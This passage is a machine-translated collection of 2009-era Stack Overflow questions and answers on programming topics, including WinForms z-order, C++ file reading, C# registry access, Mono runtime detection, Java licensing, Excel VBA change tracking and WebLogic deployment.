要正确回答这个问题，了解 AS400 使用的是哪种“SQL”会有所帮助。AS400 本身只是一个服务器。AS400 可以与许多数据库类型一起使用，例如 DB2、MS SQL Server、Oracle 等...

在不知道哪种 SQL 风格的情况下快速尝试一下，我会说您需要在日期值周围加上 ''，这样它们就不会被视为数值。

日期 >= '20080101' 和日期 <= '20090101'

# .net - 涉及 TopMost 和 Invoke 的 Z-Order 问题

> ID：721118
> 
> 赞同：0
> 
> 时间：2009-04-06T11:56:17.647
> 
> 标签：.net, winforms, invoke, z-order, topmost

我正在使用 Form.ShowDialog() 显示对话框。表单设置为 TopMost。一些图像处理计算在后台异步执行。它们的结果由 Invoke 以主要形式呈现。到现在为止还挺好。奇怪的是，模态对话框时不时地移动到主窗体后面。我想当构建对话框的消息被 Invoke 以某种方式“干扰”时会发生这种情况。

任何想法如何解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-04-08T04:18:39.320

作为一般规则，除非绝对不能，否则请避免使用 TopMost。如果你绝对不能，一次不要有超过一个 TopMost 表格。（毕竟，不可能有三种 TopMost 形式——总要有人输）。

首先，验证您在调用时正确设置了所有者`Form.ShowDialog()`。这将使新表单更有可能出现在适当的位置并全方位改进应用程序的行为。其次，验证您在任何时候都只有一个 TopMost 窗口。做这些事情的综合失败肯定会导致你的问题。例如：

```
// MainForm.cs -- Don't do this
this.TopMost = true;
childForm.TopMost = true;
childForm.ShowDialog(/*no parent spec'd*/); 
```

现在会发生什么？主窗体和子窗体都在最顶层，因此必须丢失其中一个。MainForm 在将 childForm 创建为最顶层时处于活动状态，但 childForm 没有父级。也许 Windows 决定将桌面作为其父级。这可能会导致主窗体停留在新打开的子窗体上。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-04-08T04:05:12.940

也许您可以尝试将拥有的表单作为参数传递给 ShowDialog，就像这样（VB 语法）：

```
Form.ShowDialog(Me) 
```

不确定它是否会改变任何东西，但值得一试......

另外，当您说“表单设置为 TopMost”时，您是指主表单还是模态表单？您真的需要将其设置为 TopMost 吗？有时 TopMost 表单有奇怪的行为......

# ruby-on-rails - 在 Rails 上验证有限状态机（使用 AASM）

> ID：721119
> 
> 赞同：8
> 
> 时间：2009-04-06T11:56:31.250
> 
> 标签：ruby-on-rails, ruby, rubygems, fsm, aasm

我正在使用[Rubyist](http://github.com/rubyist/aasm/tree/master)的 AASM 为 AR 对象构建一个 4 步向导。根据对象的状态，需要进行不同的验证。根据某个转换的状态来验证对象的最聪明的方法是什么？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-04-06T13:22:02.743

使用该`:if`选项，并将`with_options`它们捆绑在一起。

```
class Post < ActiveRecord::Base
  with_options :if => proc {|r| r.signup_step > 2 } do |o|
    o.validates_presence_of :title
    o.validates_presence_of :yeah
  end
end 
```

显然，你应该在 if-proc 中写什么取决于你的实现。

# c++ - 发现此文件读取代码中的错误（C++）

> ID：721129
> 
> 赞同：2
> 
> 时间：2009-04-06T11:59:30.727
> 
> 标签：c++, file-io

谁能告诉我为什么这个方法不能编译？

```
void Statistics::readFromFile(string filename)
{
    string line;
    ifstream myfile (filename);
    if (myfile.is_open())
    {
        while (! myfile.eof() )
        {
            getline (myfile,line);
            cout << line << endl;
        }
        myfile.close();
    }

    else cout << "Unable to open file"; 

} 
```

应该工作吧？然而，我总是收到以下错误消息：

```
`Line Location Statistics.cpp:15: error:
   no matching function for call to
   'std::basic_ifstream<char, std::char_traits<char> >::
      basic_ifstream(std::string*)'` 
```

`任何帮助将不胜感激。`

 `* * *

## 回答 #1

> 赞同：27
> 
> 时间：2009-04-06T12:02:45.727

```
ifstream myfile (filename); 
```

应该：

```
ifstream myfile (filename.c_str() ); 
```

此外，您的读取循环逻辑是错误的。它应该是：

```
while ( getline( myfile,line ) ){
   cout << line << endl;
} 
```

您正在使用的 eof() 函数只有在您尝试阅读某些内容后才**有意义**。

要了解为什么这会有所不同，请考虑以下简单代码：

```
int main() {
    string s; 
    while( ! cin.eof() ) {
        getline( cin, s );
        cout << "line is  "<< s << endl;
    }
} 
```

如果您运行此命令并键入 ctrl-Z 或 ctrl-D 以**立即**指示 EOF ，即使实际上没有输入任何行（因为 EOF），也会执行 cout。通常，eof() 函数不是很有用，您应该改为测试 getline() 或流提取运算符等函数的返回值。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2009-04-06T12:07:13.953

阅读编译器错误：

```
no matching function for call to 'std::basic_ifstream >::basic_ifstream(std::string*) 
```

**`No matching function for call to:`**它找不到您要调用的函数

**`std::basic_ifstream >::`**- ifstream 的成员函数

**`:basic_ifstream(std::string*)`**- 将字符串指针作为参数的构造函数

因此，您尝试通过将字符串指针传递给其构造函数来创建 ifstream。而且它找不到接受这样一个参数的构造函数。

由于您没有在上面传递字符串指针，因此您发布的代码必须与您的实际代码不同。在询问代码时始终复制/粘贴。错别字使您无法找出问题所在。无论如何，我记得，构造函数不接受字符串参数，而只接受 const char*。所以 filename.c_str() 应该可以解决问题

除此之外，您可以更简单地执行此操作：

```
ifstream myfile (filename);
    std::copy(std::istream_itrator<std::string>(myfile),
              std::istream_itrator<std::string>(),
              std::ostream_iterator<std::string>(std::cout));
} 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-04-06T12:05:12.273

[ifstream](http://www.cplusplus.com/reference/iostream/ifstream/ifstream.html)构造函数具有以下签名

```
explicit ifstream ( const char * filename, ios_base::openmode mode = ios_base::in ); 
```

您需要传入一个常量 char* 和一个模式，例如：

```
ifstream ifs ( "test.txt" , ifstream::in ); 
```

该模式是可选的，因为它定义了一个默认值，所以你可以使用：

```
ifstream myfile ( filename.c_str() ); 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-04-06T12:06:13.083

您应该使用 fileName.c_str() 以便将 const char* 指针传递给 myFile 构造。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-04-06T04:26:50.193

C++11 标准已经解决了这个缺陷。`std::ifstream myfile(filename);`现在应该编译，什么时候`filename`有 type `std::string`。

# iis - IIS 作为反向代理

> ID：721138
> 
> 赞同：5
> 
> 时间：2009-04-06T12:02:57.257
> 
> 标签：iis, reverse-proxy, http-authentication

我正在研究让 IIS 在 J2EE 服务器 (JBoss) 上执行的应用程序中进行身份验证。有什么方法可以让 IIS 充当反向代理并传播代理应用程序（JBoss）的用户名和/或角色。如果可能的话，我还需要什么 IIS 版本？我有 IIS 的许可证，所以我想在 IIS 中进行，否则我更喜欢开源。

谢谢！

托马斯

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-04-06T13:43:21.740

它不是开源的，但 IIS 7.0 的 ApplicationRequestRouting 可以充当反向代理。

更多信息：http: [//blogs.iis.net/wonyoo/archive/2008/07/09/application-request-routing-arr-as-a-reverse-proxy.aspx](http://blogs.iis.net/wonyoo/archive/2008/07/09/application-request-routing-arr-as-a-reverse-proxy.aspx)

下载： [http ://www.iis.net/extensions/ApplicationRequestRouting](http://www.iis.net/extensions/ApplicationRequestRouting)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-04-06T12:08:19.287

Microsoft ISA 服务器就是这样做的——您可能想先看看它。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-10-23T00:27:11.453

[IIRF](http://iirf.codeplex.com)为 IIS5/6/7 进行反向代理和 URL 重写。

它是开源的，并使用类似于 mod_proxy / .htaccess 的语法作为其规则。

您需要 v2.0 才能获得反向代理功能。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-10-23T00:11:34.507

您可能想看看[http://www.managedfusion.com/products/url-rewriter/](http://www.managedfusion.com/products/url-rewriter/)

# c# - 如何在 C# 中获取注册表写入权限

> ID：721145
> 
> 赞同：7
> 
> 时间：2009-04-06T12:06:26.263
> 
> 标签：c#

我正在尝试在 HKEY_CURRENT_USER\Software\appname 处写入 Windows 注册表，但是当我尝试写入密钥时，我不断收到权限错误，我已将以下内容添加到我的程序集中：

```
[assembly: RegistryPermissionAttribute(SecurityAction.RequestMinimum, Write = @"HKEY_CURRENT_USER\\Software")] 
```

但这并没有解决问题，我还应该做些什么吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-04-06T12:09:51.420

我不认为这就像您在没有指定要写访问权限的情况下打开密钥一样简单？该`OpenSubKey(string)`方法仅提供只读访问权限。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-04-06T12:22:15.617

[RegistryPermissionAttribute](http://msdn.microsoft.com/en-us/library/system.security.permissions.registrypermissionattribute.aspx)是[代码访问安全又名 CAS](http://msdn.microsoft.com/en-us/library/930b76w0.aspx)的一部分，这是一个权限系统，用于检查您在 .NET 框架内拥有的权限，这些权限由安全策略定义。[有4个安全策略](http://en.wikipedia.org/wiki/Code_Access_Security#Policy)：

*   企业 - 作为 Active Directory 安装一部分的一系列计算机的策略。
*   机器 - 当前机器的策略。
*   用户 - 登录用户的策略。
*   AppDomain - 执行应用程序域的策略。

前 3 个是在 .NET 配置工具的配置屏幕中配置的，最后一个是在运行时配置的。

我首先解释这一点的原因是因为 RegistryPermissionAttribute 只检查您的 .NET 权限，它不检查**操作系统**权限。

您可以使用[System.Security.AccessControl](http://msdn.microsoft.com/en-us/library/system.security.accesscontrol.aspx)来检查操作系统权限，但要获得权限，您可能需要提升或模拟权限。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-04-06T12:46:21.863

确保应用程序使用具有足够权限访问注册表的用户帐户运行。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-05-10T16:21:16.220

我在这里看不到答案或解决方案。我在搜索其他内容时发现了这个问题。

我认为可能需要的一件事是，如果您从 exe 运行，则需要以管理员身份运行。如果您从 VS 运行，则需要确保 VS 以管理员身份运行。如果是，VS 将在窗口标题中显示“（管理员）”。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2009-04-06T12:44:21.430

这对我有用。钥匙已经在那里并且没有它。没有任何特殊的程序集属性。

```
using System;
using Microsoft.Win32;

namespace WriteToRegistry {
  class Program {
    static void Main(string[] args) {
      const string csRootKey = @"Software\MyCompany\Test";

      using (RegistryKey loRegistryKey = Registry.CurrentUser.CreateSubKey(csRootKey)) {
        if (loRegistryKey == null)
          throw new InvalidOperationException("Could not create sub key " + csRootKey);

        loRegistryKey.SetValue("CurrentTime", DateTime.Now.ToString(), RegistryValueKind.String);
      }
    }
  }
} 
```

编辑：重新阅读问题后，问题似乎可能是操作系统权限。

# django - 有没有办法在一行中定义 2 元组？

> ID：721149
> 
> 赞同：1
> 
> 时间：2009-04-06T12:07:28.430
> 
> 标签：django, django-models

我对python没有经验。我需要定义具有范围限制的字段“年份”。现在我正在使用这段代码，但我认为存在缩短方法来做到这一点。

```
YEAR_CHOICE = []
for year in range(2020,1899,-1):
   YEAR_CHOICE += [(year, year)]
year = models.PositiveSmallIntegerField('Year', choices=YEAR_CHOICE, default=0) 
```

有什么方法可以在一行中定义 2 元组吗？可能我可以用其他方式制作我需要的字段吗？谢谢！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-04-06T12:11:53.693

你应该看看使用[**列表推导**](http://diveintopython.net/native_data_types/mapping_lists.html)：

```
YEAR_CHOICE = [(year,year) for year in xrange(2020,1899,-1)] 
```

您还应该使用`xrange`而不是`range`. `xrange`是首选，因为它会一一返回值，而不是创建整个列表。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-04-06T12:12:05.267

用自身[压缩范围：](http://docs.python.org/library/functions.html#zip)

```
YEAR_CHOICE = zip(*[range(2020,1899,-1)]*2) 
```

或使用[列表理解](http://docs.python.org/tutorial/datastructures.html#list-comprehensions)：

```
YEAR_CHOICE = [(year,year) for year in range(2020,1899,-1)] 
```

# java - 最佳实践：Java 桌面应用程序的许可证实施

> ID：721155
> 
> 赞同：8
> 
> 时间：2009-04-06T12:09:26.537
> 
> 标签：java, licensing

在 Java 应用程序中实施许可证强制执行的最佳方式是什么，以便在没有用户购买许可证的情况下不能“分发”和使用该应用程序？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-04-06T12:44:27.640

Take a look at [truelicense](http://truelicense.net/) which is an open source framework for doing just that. If you want to make your own there is some documentation that explains the concepts and you can probably get some good ideas by looking at the code as well.

**EDIT:** worth mentioning that it is not a copy-protection scheme

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-04-06T12:19:12.363

I suggest you don't even attempt to add copy protection. You will just annoy people. You are much more likely to get sales if people like your product. Being petty and treating customers like thieves is not going to help. (Unless the product really sucks, and you have to prevent people from being able to try it before they buy.)

You might want to send a license key the sole purpose of which is to satisfy users that want to receive something for their money. Just add a status somewhere to show whether it has been paid for. The status needs to be reasonably obvious so that it is clear that something has happened (a product I worked on along time ago came on floppy two discs - half of the support calls were because the installer didn't ask for the second [win32s] disc).

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2009-04-06T14:26:21.340

我知道没有一个不容易破解的许可计划。我不会详细说明，但作为一个例子，在 Java 的情况下，如果它是用 Java 完成的，那么它可以被反编译（C++ 或任何编译语言也可以，但 Java 比 C++ 更容易）。如果它是本地完成的，那么您需要本地方法，并且 DLL/so 可以替换为允许访问的方法。

对于 C/C++ 示例，我知道有人反编译了 CL（Microsoft 编译器）来弄清楚他们是如何进行名称修饰的。他们所拥有的只是二进制文件，而且他们能够使用反汇编程序和大量时间来完成。

不要为这种事情烦恼，它会惹恼诚实的用户并适度减慢那些想要复制它的人。 [看看 World of Goo（很棒的游戏！）以及他们对 DRM 的看法](http://arstechnica.com/gaming/news/2008/10/world-of-goo-devs-on-drm-we-trust-you-dont-steal-from-us.ars)（这与您所说的类似）。

World of Goo 的开发人员发现他们的[产品在 90% 的情况下都被盗版](http://2dboy.com/2008/11/13/90/)（他们解释了这个数字是如何不准确的），这与另一款带有 DRM 且被盗版率高达 92% 的游戏形成鲜明对比。

如果您谈论的是合法企业，那么他们通常希望遵守许可证，因此确保他们不复制是一种浪费。如果您谈论的是那些一开始就不会购买产品的人，或者只是不想为此付费，那么您并不会真正改变非法获得您的软件的人数，您只会减慢第一个得到它的人 - 之后猫就从袋子里出来了。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-04-06T12:49:05.507

我个人认为 IntelliJ 做对了：30 天的全功能版本。你不应该比这更严格。

“功能齐全”的部分很重要。如果您的未注册版本如此残缺无用，您希望人们如何决定购买它？他们必须先尝试功能，然后才能决定喜欢并想要它们，但一些供应商认为人们会根据他们无法尝试的功能的承诺购买东西的想法是荒谬的。

甲骨文处于最自由的一端。您基本上可以下载他们软件的全功能版本并使用它。他们将许可视为一个社会问题，这一论点有很多优点。

您不应该唠叨或以其他方式惹恼您的潜在客户（除了可能在预定期限后使软件过期）。您应该给出的最重要的通知是在启动屏幕或其他内容上的“X 将在 N 天后过期”。

您可以并且应该做的另一件事是为您的软件提供较低的进入门槛。

提供便宜的（如果不是免费的）学术或个人版本。营销也是一个好主意。我的意思是采用 IntelliJ：它免费提供给已批准的开源项目。

至于执法的技术方面：不要太在意技术方面。永远不要选择任何会惹恼您的用户的方案，或者更糟糕的是，会减慢您的软件速度（就像某些方案所做的那样）或（甚至更糟）违反用户操作系统的安全性（例如 Sony rootkit 惨败）。您的执法并不意味着是防黑客的。如果人们想窃取您的软件，他们会的。执法系统只是对社会而非技术问题的温和提醒（仅此而已）。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-07-19T13:31:20.310

在阅读了 oracle 的 BCL（它肯定了商业自由）之后。然后我与一位甲骨文代表进行了交谈，他说 JavaSE 可以免费用于商业用途！

# excel - Excel VBA 宏用于跟踪单独工作表中的更改

> ID：721160
> 
> 赞同：2
> 
> 时间：2009-04-06T12:10:08.597
> 
> 标签：excel, vba, tracking

我正在尝试编写一个 VBA 宏来跟踪对单独工作表中工作簿的更改。

如果您手动执行此操作，则命令序列为工具 > 跟踪更改 > 突出显示更改，并采用选项分离工作表。您必须对命令进行两次迭代，一次激活内联跟踪，第二次将跟踪移动到单独的工作表。

使用宏记录器，我得到了这段代码：

```
With ActiveWorkbook
    .Save
    .KeepChangeHistory = True
    .HighlightChangesOptions When:=xlAllChanges
    .ListChangesOnNewSheet = True
    .HighlightChangesOnScreen = False
    .Worksheets("History").Select
End With 
```

当我运行它时，我收到错误*HighlightChangesOptions method failed*。有什么建议么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-04-06T14:20:00.670

HighlightChangesOptions 方法仅在工作簿已共享时才有效。在 UI 中，打开 HighlightChange 将自动共享工作簿，但在 VBA 中则不然。

```
Application.DisplayAlerts = False
With ActiveWorkbook
    .SaveAs , , , , , , xlShared
    .KeepChangeHistory = True
    .HighlightChangesOptions When:=xlAllChanges
    .ListChangesOnNewSheet = True
    .HighlightChangesOnScreen = False
    .Worksheets("History").Select
End With
```

DisplayAlerts 调用将阻止 Excel 警告您正在覆盖现有工作簿 - 本身。您可能想评论这条线只是为了看看发生了什么。

请注意，此代码不能存在于共享工作簿中。共享工作簿后，代码将停止执​​行并出现错误。它必须存在于不同的工作簿或加载项中。

# c# - 如何检测正在使用哪个 .NET 运行时（MS 与 Mono）？

> ID：721161
> 
> 赞同：48
> 
> 时间：2009-04-06T12:11:23.990
> 
> 标签：c#, mono, clr

我想知道在程序执行期间是使用 Mono 运行时还是 Microsoft 运行时执行的。

我目前正在使用以下代码来确定我是否在 MS CLR 上：

```
static bool IsMicrosoftCLR()
{
    return RuntimeEnvironment.GetRuntimeDirectory().Contains("Microsoft");
} 
```

但是，这在某种程度上取决于运行时的安装文件夹，我不确定这是否适用于所有安装。

有没有更好的方法来检查当前运行时？

* * *

## 回答 #1

> 赞同：78
> 
> 时间：2009-04-06T12:24:37.093

从 Mono Project's [Guide to Porting Winforms Applications](http://www.mono-project.com/Guide:_Porting_Winforms_Applications)：

```
public static bool IsRunningOnMono ()
{
    return Type.GetType ("Mono.Runtime") != null;
} 
```

我相信你会有更多的问题，所以值得查看本指南和[单声道论坛](http://www.go-mono.com/forums/)

* * *

## 回答 #2

> 赞同：24
> 
> 时间：2009-04-06T12:19:27.170

您可以像这样检查 Mono 运行时

```
bool IsRunningOnMono = (Type.GetType ("Mono.Runtime") != null); 
```

* * *

## 回答 #3

> 赞同：13
> 
> 时间：2015-08-15T20:12:07.910

随着 C# 6 的出现，现在可以将其转换为仅获取属性，因此实际检查只进行一次。

```
internal static bool HasMono { get; } = Type.GetType("Mono.Runtime") != null; 
```

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2009-04-06T12:21:50.627

只需运行以下代码..

```
static bool IsMicrosoftCLR()
{
    return (Type.GetType ("Mono.Runtime") == null)
} 
```

* * *

## 回答 #5

> 赞同：8
> 
> 时间：2015-08-17T21:49:14.130

这是我在项目中使用的带有缓存的版本：

```
public static class PlatformHelper
{
    private static readonly Lazy<bool> IsRunningOnMonoValue = new Lazy<bool>(() =>
    {
        return Type.GetType("Mono.Runtime") != null;
    });

    public static bool IsRunningOnMono()
    {
        return IsRunningOnMonoValue.Value;
    }
} 
```

正如@ahmet alp balkan 提到的，如果您经常调用它，缓存在这里很有用。通过将其包装在 a`Lazy<bool>`中，反射调用只发生一次。

# c# - 如何确定给定字体的字符串的大小

> ID：721168
> 
> 赞同：19
> 
> 时间：2009-04-06T12:14:46.057
> 
> 标签：c#, .net, winforms, fonts

我有一个显示一些进度信息的小表格。
我很少需要显示相当长的消息，并且我希望能够在需要时调整此表单的大小，以便此消息适合表单。

那么我如何找出`S`以字体呈现的字符串宽度`F`？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2009-04-06T12:22:15.430

这取决于所使用的渲染引擎。您基本上可以在 GDI 和 GDI+ 之间切换。可以通过相应地设置`[UseCompatibleTextRendering](http://msdn.microsoft.com/en-us/library/microsoft.visualbasic.applicationservices.windowsformsapplicationbase.usecompatibletextrendering.aspx)`属性来完成切换

使用 GDI+ 时，您应该使用`MeasureString`：

```
string s = "A sample string";

SizeF size = e.Graphics.MeasureString(s, new Font("Arial", 24)); 
```

当使用 GDI（即本机 Win32 渲染）时，您应该使用`TextRenderer`该类：

```
SizeF size = TextRenderer.MeasureText(s, new Font("Arial", 24)); 
```

请参阅本文：[文本渲染：使用 Windows 窗体控件中的复杂脚本构建世界通用的应用程序](http://msdn.microsoft.com/en-us/magazine/cc751527.aspx)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-04-06T12:18:33.240

这个怎么样：

```
Size stringsize = graphics.MeasureString("hello", myFont); 
```

（[这](http://msdn.microsoft.com/en-us/library/ms535829(VS.85).aspx)是 MSDN 链接。）

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2021-06-15T02:48:49.237

对于这个答案，我使用了一个辅助函数：

```
private static double ComputeSizeOfString(string text, string fontFamily, double fontSize)
{
      System.Drawing.Font font = new(fontFamily,  (float)fontSize);
      System.Drawing.Image fakeImage = new System.Drawing.Bitmap(1, 1);
      System.Drawing.Graphics graphics = System.Drawing.Graphics.FromImage(fakeImage);
      return graphics.MeasureString(text, font).Width;
} 
```

因此，基本上该方法使用尺寸为 (1,1) 的 fakeimage 来计算字符串的长度，在这种情况下是从您选择的文本创建的图像的宽度。

如何使用它的示例最终如下所示：

```
string myTxt = "Hi there";
double szs = ComputeSizeOfString(myTxt, "Georgia", 14); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-04-06T12:18:35.003

回到 Win32，我为此使用了 VisualStyleRenderer::GetTextExtent 的等效函数。

# sql - 我将如何设计一个数据仓库来使用 SSAS 将数据存储在多维数据集中？

> ID：721169
> 
> 赞同：1
> 
> 时间：2009-04-06T12:14:52.717
> 
> 标签：sql, sql-server, ssas, data-warehouse

我在数据库中有这样的结构

| 角色ID | 角色类型ID | 个人ID | 组织ID | 从日期 | 截止日期 |

每个角色仅对 FromDate 和 ToDate 之间的日期有效。

每个人都有姓名、性别和出生日期。

我想将此日期放入数据仓库以与 SSAS 一起使用。

在那里，我希望能够构建具有每个组织、每个角色类型、每个性别、每个年龄每个时间的角色数量的多维数据集。

我将如何设计一个 DW 来存储它，仅仅因为年龄和性别数据组合，我可能会得到大约 200 行，但是我还有角色类型和组织。

例如像行

|2009-01-01|RoleTypeID=员工|组织=总部|性别=男性|年龄=32|人数=17| |2009-01-01|RoleTypeID=员工|组织=总部|性别=女性|年龄=32|人数=12| |2009-01-01|RoleTypeID=员工|组织=总部|性别=男性|年龄=33|人数=18|

直觉告诉我我走错了路……</p>

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-04-06T13:01:13.217

如果没有对所涉及的基础知识有很好的扎实掌握和理解，数据仓库项目实际上是无法进入的。设计过程与“关系模型”不同，需要您对数据进行不同的思考。

我对您的建议是获取以下文本的副本。这是一个极好的资源，将引导您完成整个项目所需的步骤。

[http://www.amazon.com/Microsoft-Data-Warehouse-Toolkit-Microsoft-Business-Intelligence/dp/0471267155](https://rads.stackoverflow.com/amzn/click/com/0471267155)

# pagination - Infragistics UltraWebGrid custom paging

> ID：721170
> 
> 赞同：0
> 
> 时间：2009-04-06T12:15:38.643
> 
> 标签：pagination, infragistics, ultrawebgrid

I am using Infragistics UltraWebGrid in my application when I use custom paging I am not able to retrieve the specified number of records per page

The code I have written is string[] cusLabel;

in the grid initialise

```
grid.DisplayLayout.Pager.AllowCustomPaging = true;
grid.DisplayLayout.Pager.AllowPaging = true;        
grid.DisplayLayout.Pager.StyleMode = PagerStyleMode.CustomLabels;
grdSysManager.DisplayLayout.Pager.PageSize = 3;
getCustomLabel();
grdSysManager.DisplayLayout.Pager.CustomLabels = cusLabel;

private void getCustomLabel()
{
    DataTable dt = (DataTable)grdSysManager.DataSource;
    DataSet ds = new DataSet();
    ds = dt.DataSet;
    //ds = (DataSet)grdSysManager.DataSource;
    int NoOfRows = ds.Tables[0].Rows.Count;
    int PageSize = grdSysManager.DisplayLayout.Pager.PageSize;
    if (NoOfRows % PageSize == 0)
    {
        totalNoOfPagings = NoOfRows / PageSize;
    }
    else
    {
        totalNoOfPagings = (NoOfRows / PageSize) + 1;
    }

    cusLabel = new string[totalNoOfPagings + 2];

    cusLabel[0] = "First";

    for (int i = 1; i <= totalNoOfPagings; i++)
    {
        cusLabel[i] = i.ToString();
    }

    cusLabel[totalNoOfPagings + 1] = "Last";
} 
```

Above is the code I written but it is displaying all the records from the table instead of 3 records per page. Am I missing anything?

Thanks

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-03-07T11:40:42.933

```
<table cellspacing='0' cellpadding='0' width='100%'>  
   <tr>  
       <td width='12%' align='left'>  
           [currentpageindex]/[pagecount]  
      </td>  
       <td width='76%'>  
           <b>[page:1:First]&nbsp;[prev]</b>  
           &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  
           [default]  
           &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  
           <b>[next]&nbsp;[page:[pagecount]:Last]</b>  
       </td>  

       <td width='12%' align='right' title='Enter page number and press Enter'>  
           Go to:  
           <input id='xtxtGotoPage' size='5' 
           style='font-family:verdana;font-size:8pt;padding:0 0 0 0' 
           type='text' onKeyPress='return gotoPage()' autocomplete='off' />  
      </td>  
   </tr>  
</table> 
```

此模式可以在网格设计器中、直接在网格标记中甚至在运行时分配给 Pager.Pattern 属性。剩下的唯一事情是实现`gotoPage()`JavaScript 函数（标记，第 17 行），该函数将转到用户输入的页码。这里是：

```
function gotoPage() {  

    if (event.keyCode == 13) {  

        var otxtGotoPage = event.srcElement;  
        var iPageNo = otxtGotoPage.value  

        if (!isNaN(iPageNo)) {  

            var oGrid = igtbl_getGridById('xuwgMyGrid');  

            if (iPageNo < 1 || iPageNo > oGrid.PageCount) {  
                alert('Please enter page number between 1 and ' +  
                        oGrid.PageCount)  
            } else {  
                oGrid.goToPage(iPageNo)  
            }     

        } else {  

            alert('Please enter correct numeric page number');  

        }  

        otxtGotoPage.focus();  
        otxtGotoPage.value = '';  
        return false;  
    }  
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-04-07T01:40:20.003

我相信这`PageSize`是自定义标签的数量，当您使用自定义分页时。为了给网格每页只提供三行，您必须在网格的 DataBinding 事件中只给它三行。

使用此网格的自定义分页不仅仅是寻呼机的自定义外观 - 它是关于您自己控制大部分分页过程。网格将显示您的自定义标签，并将它们全部变成超链接，除了指示为当前页面的那个。当您单击其中一个链接时，将引发 PageIndexChanged，它会告诉您单击的链接的索引。你用那个索引做什么取决于你。

# java-me - 在 Java 中拦截诺基亚 Ctrl/Chr 按键

> ID：721171
> 
> 赞同：2
> 
> 时间：2009-04-06T12:16:38.253
> 
> 标签：java-me, keyboard, nokia, qwerty

我正在尝试拦截完整的 QWERTY 诺基亚设备 (E71) 上的 Ctrl/Chr 键。似乎没有为此特定键生成 keyPress 事件。

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-04-08T19:33:37.950

这个键很有可能只是一个键码修饰符。

您可能只能看到它是否与另一个同时按下。

它不完全是在电话上不触发 Canvas.keyPressed() 回调的第一个键。

# java - 在 oracle Weblogic 10.01 中部署 Web 服务的问题

> ID：721172
> 
> 赞同：0
> 
> 时间：2009-04-06T12:17:50.497
> 
> 标签：java, oracle10g, weblogic

我正在使用 jwsc 来构建我的 web 服务应用程序。这会生成一个带有 weblogic.xml 的 war 文件，如下所示：

```
<?xml version='1.0' encoding='UTF-8'?>
<weblogic-web-app xmlns="http://www.bea.com/ns/weblogic/weblogic-web-app"  
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.bea.com/ns/weblogic/weblogic-web-app http://www.bea.com/ns/weblogic/weblogic-web-app/1.0/weblogic-web-app.xsd">
      <context-root>eori-ws</context-root>
    </weblogic-web-app> 
```

如您所见，命名空间指向 bea.com。当我尝试将战争（在耳朵内）部署到我的 weblogic 时，我得到以下信息：

```
 An error occurred during activation of changes, please see the log for details.
            [HTTP:101064][WebAppModule(eori_services:eori-ws)] Error parsing descriptor in Web appplication 
"/softs/apps/bea1001/user_projects/domains/myapp/servers/myServer/tmp/_WL_user/myapp/jd3urj/myapp-ws.war" 
weblogic.application.ModuleException: Unmarshaller failed at 
weblogic.servlet.internal.WebAppModule.loadDescriptor(WebAppModule.java:858) at 
weblogic.servlet.internal.WebAppModule.prepare(WebAppModule.java:285) 

   (snip)
   weblogic.work.SelfTuningWorkManagerImpl$WorkAdapterImpl.run(SelfTuningWorkManagerImpl.java:464) 
at weblogic.work.ExecuteThread.execute(ExecuteThread.java:200) at 
weblogic.work.ExecuteThread.run(ExecuteThread.java:172) Caused by: 
com.bea.xml.XmlException: failed to load java type corresponding to e=weblogic-web-app@http://www.bea.com/ns/weblogic/weblogic-web-app  at 
com.bea.staxb.runtime.internal.UnmarshalResult.getPojoBindingType(UnmarshalResult.java:329) 
at 
com.bea.staxb.runtime.internal.UnmarshalResult.determineTypeForGlobalElement(UnmarshalResult.java:296) 
at 

    (snip)
    weblogic.servlet.internal.WebAppDescriptor.getWeblogicWebAppBean(WebAppDescriptor.java:164) 
at weblogic.servlet.internal.WebAppModule.loadDescriptor(WebAppModule.java:853) 
... 25 more weblogic.application.ModuleException: Unmarshaller failed
    Failed to load java type corresponding to e=weblogic-web-app@http://www.bea.com/ns/weblogic/weblogic-web-app 
```

我尝试更改 url 以匹配新域，但我得到了同样的错误。我已经尝试下载 xsd 并将其放在 weblogic.xml 的同一文件夹中，我更改为：

```
<?xml version='1.0' encoding='UTF-8'?>
<weblogic-web-app xmlns="http://xmlns.oracle.com/weblogic/weblogic-web-app" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="weblogic-web-app.xsd">
  <context-root>eori-ws</context-root>
</weblogic-web-app> 
```

并且错误仍然相同

我没主意了。有什么帮助吗？

